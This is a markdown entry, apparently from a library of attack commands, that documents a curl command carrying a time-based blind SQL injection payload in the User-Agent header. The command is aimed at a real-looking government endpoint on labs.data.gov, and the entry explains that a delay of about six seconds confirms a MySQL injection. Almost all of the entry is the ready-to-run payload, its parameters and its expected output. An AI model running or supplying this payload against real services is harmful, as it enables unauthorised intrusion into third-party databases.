---
id: cmd-6s-curl
data: >-
  curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36
  (KHTML, like Gecko)
  Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'" -H "Referer:
  1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H
  "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 10
  https://labs.data.gov/dashboard/datagov/csv_to_json
tags:
  - sqli
  - http
  - injection
type: command
output: HTTP response after ~6 seconds
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:10.336Z'
verified: false
validated: true
submitted: true
---
# curl-inject-6s-payload

## Command

```bash
curl -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'" -H "Referer: 1" -H "X-Forwarded-For: 1" -H "X-Requested-With: XMLHttpRequest" -H "Accept-Encoding: gzip,deflate" -H "Accept: */*" --connect-timeout 10 https://labs.data.gov/dashboard/datagov/csv_to_json
```

## Description

Executes a SQL injection with arithmetic subtraction for a 6-second delay to test variable timing in MySQL via User-Agent.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "User-Agent: ..."` | Payload with 6*6-30 calculation | Yes |
| `--connect-timeout 10` | Handle 6s + overhead | Yes |

## Examples

### Basic Usage

```bash
curl -H "User-Agent: variable_payload" https://target/endpoint
```

### Advanced Usage

```bash
curl -w "%{time_total}s" -H "User-Agent: payload" --connect-timeout 10 https://labs.data.gov/dashboard/datagov/csv_to_json
```

## Expected Output

Response after about 6 seconds, validating the calculation.

## Related

- [[commands/curl-inject-25s-payload]]
- [[procedures/Confirm-SQLi-with-6-Second-Delay]]
